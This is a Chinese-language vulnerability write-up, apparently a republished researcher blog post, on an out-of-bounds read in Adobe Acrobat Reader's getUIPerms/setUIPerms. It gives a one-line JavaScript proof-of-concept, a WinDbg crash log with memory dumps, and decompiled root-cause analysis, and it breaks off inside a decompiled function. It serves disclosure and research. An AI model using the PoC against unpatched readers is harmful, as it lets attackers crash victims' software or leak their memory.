**作者：o0xmuhe**
**来源：[Adobe Acrobat Reader getUIPerms/setUIPerms Unicode String Out-of-bound
Read](https://o0xmuhe.github.io/2019/08/14/Adobe-Acrobat-Reader-getUIPerms-setUIPerms-Unicode-String-Out-of-bound-Read/# "Adobe Acrobat Reader
getUIPerms/setUIPerms Unicode String Out-of-bound Read") **
Unicode String Out-of-bound Read
8月补丁被xlab撞了，索性就放出来了。
## 0x00 : PoC
`doc`对象的`getUIPerms`函数的越界读
    app.doc.getUIPerms({cFeatureName:"\xFE\xFFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"})
其实setUIPerms也能触发，但是参数和这个getUIPerms不太一样，但是核心问题都是一样的。
## 0x01 : Crash log
    0:000> g
    (2a70.388): Access violation - code c0000005 (!!! second chance !!!)
    eax=32d7cf00 ebx=0098cbd0 ecx=00000000 edx=32d7d000 esi=00000068 edi=7fffffff
    eip=59ca7675 esp=0098ca98 ebp=0098caa4 iopl=0         nv up ei ng nz ac pe cy
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010297
    EScript!mozilla::HashBytes+0x47e7f:
    59ca7675 8a02            mov     al,byte ptr [edx]          ds:002b:32d7d000=??
    0:000> k10
     # ChildEBP RetAddr  
    WARNING: Stack unwind information not available. Following frames may be wrong.
    00 0098caa4 59c52b96 EScript!mozilla::HashBytes+0x47e7f
    01 0098cab8 59c545c4 EScript!PlugInMain+0x1119
    02 0098cad8 59c54331 EScript!PlugInMain+0x2b47
    03 0098cb0c 59ca76d5 EScript!PlugInMain+0x28b4
    04 0098cb24 59ca29f4 EScript!mozilla::HashBytes+0x47edf
    05 0098cb9c 59c93bb3 EScript!mozilla::HashBytes+0x431fe
    06 0098cbec 59c93912 EScript!mozilla::HashBytes+0x343bd
    07 0098cc64 59ca1f86 EScript!mozilla::HashBytes+0x3411c
    08 0098cce0 59c86d06 EScript!mozilla::HashBytes+0x42790
    09 0098cd54 59c8175d EScript!mozilla::HashBytes+0x27510
    0a 0098d210 59c80606 EScript!mozilla::HashBytes+0x21f67
    0b 0098d250 59c80517 EScript!mozilla::HashBytes+0x20e10
    0c 0098d28c 59c80460 EScript!mozilla::HashBytes+0x20d21
    0d 0098d2bc 59c68ec3 EScript!mozilla::HashBytes+0x20c6a
    0e 0098d304 59ca87ac EScript!mozilla::HashBytes+0x96cd
    0f 0098d380 59ca84ec EScript!mozilla::HashBytes+0x48fb6
    0:000> dd edx-10
    32d7cff0  41414141 41414141 41414141 d0004141
    32d7d000  ???????? ???????? ???????? ????????
    32d7d010  ???????? ???????? ???????? ????????
    32d7d020  ???????? ???????? ???????? ????????
    32d7d030  ???????? ???????? ???????? ????????
    32d7d040  ???????? ???????? ???????? ????????
    32d7d050  ???????? ???????? ???????? ????????
    32d7d060  ???????? ???????? ???????? ????????
    0:000> dd edx-0x80
    32d7cf80  00000067 00001000 00000000 00000000
    32d7cf90  0475f34c dcbabbbb 4141fffe 41414141
    32d7cfa0  41414141 41414141 41414141 41414141
    32d7cfb0  41414141 41414141 41414141 41414141
    32d7cfc0  41414141 41414141 41414141 41414141
    32d7cfd0  41414141 41414141 41414141 41414141
    32d7cfe0  41414141 41414141 41414141 41414141
    32d7cff0  41414141 41414141 41414141 d0004141
参数是 `\xFE\xFF\x41414141.....`
`edx`指向参数
## 0x02 : Analysis
读`unicode`字符串函数，是没有问题的，应该是上层逻辑的问题，没有做充分的判断，导致用读`unicode string`的逻辑去读取了`ascii
string` 。
这就导致，读取了更多的数据，然后就`oob`了。
    unsigned int __cdecl sub_23802B75(char *a1, unsigned int a2, void (__cdecl *a3)(const wchar_t *, const wchar_t *, const wchar_t *, unsigned int, uintptr_t))
    {
      unsigned int result; // eax
      if ( a1 && *a1 == 0xFEu && a1[1] == 0xFFu )
        result = sub_2385763B(a1, a2, a3);          // unicode
      else
        result = sub_23802BA9(a1, a2, a3);          // ascii string
      return result;
    }
调试，漏洞发生时参数信息如下：
可以看到，传入的参数并不是`unicode string`，但是却按照`unicode string`的代码逻辑去读，所以就越界了。
上一层逻辑中，我们看到，对于读取字符串的逻辑来说，只简单的检查了：
  1. 字符串是否有效
  2. 字符串开头是否是\xFE\xFF
  3. 满足2，就走unicode逻辑
  4. 不满足就走ascii逻辑
但是这里应该不是`root cause`，而且这部分底层逻辑也没啥问题，应该是上层的逻辑出了问题，导致下层代码执行时候崩溃。
问题出在 `app.doc.getUIPerms()` 函数实现，在参数传递的时候，参数处理考虑不周导致。
需要找这个对象注册方法的地方，找了一圈，发现这个方法的实现在`DigSig.api`中。
    0:000> da poi(esp+8)
    553dfbbc  "getUIPerms"
    0:000> ln poi(esp+c)
    (55311705)   DigSig!PlugInMain+0x48f3a   |  (55311705)   DigSig!PlugInMain
函数实现如下:
    int __usercall sub_23056B10@(_DWORD *a1@)
    {
      int v1; // edi
      bool v2; // zf
      int v3; // eax
      int v4; // eax
      int v5; // ST08_4
      int v6; // ST04_4
      int v7; // eax
      signed int v8; // edi
      int v9; // eax
      int v10; // esi
      char v11; // al
      signed int v12; // ecx
      signed int v14; // [esp-8h] [ebp-8h]
      sub_23002069(80);
      v1 = a1[2];
      v2 = (*(int (__thiscall **)(_DWORD, _DWORD))(dword_23124F64 + 204))(*(_DWORD *)(dword_23124F64 + 204), a1[2]) == 0;
      v3 = dword_23124F64;
      if ( !v2 )
      {
        v14 = 13;
    LABEL_3:
        (*(void (__cdecl **)(int, _DWORD, _DWORD, signed int, _DWORD))(v3 + 352))(v1, a1[3], a1[4], v14, 0);
        return sub_230022F2();
      }
      v4 = (*(int (__cdecl **)(int))(dword_23124F64 + 828))(v1);
      *(a1 - 6) = v4;
      if ( !v4 )
      {
        v3 = dword_23124F64;
        v14 = 14;
        goto LABEL_3;
      }
      sub_230D8FCE(v1);
      *(a1 - 23) = "cFeatureName";
      *(a1 - 21) = 0;
      *(a1 - 5) = 0;
      *(a1 - 20) = a1 - 4;
      *(a1 - 4) = 0;
      *((_WORD *)a1 - 32) = 0;
      *(a1 - 19) = 0;
      *(a1 - 18) = 0;
      v5 = a1[4];
      *(a1 - 15) = 0;
      v6 = *(a1 - 13);
      *(a1 - 14) = 0;
      v7 = dword_23124F64;
      *(a1 - 1) = 0;
      *(a1 - 22) = 6;
      *(a1 - 17) = 5;
      *((_WORD *)a1 - 31) = 1;
      if ( (*(unsigned __int16 (__thiscall **)(_DWORD, _DWORD *, int, int, _DWORD *, _DWORD *))(v7 + 368))(
             *(_DWORD *)(v7 + 368),
             a1 - 23,
             v6,
             v5,
             a1 - 5,
             a1 - 8) )
      {
        v8 = -1;
        sub_2301A104(*(a1 - 4), 0);
        *((_BYTE *)a1 - 4) = 1;
        v9 = sub_230C2D45(0, 5, 2);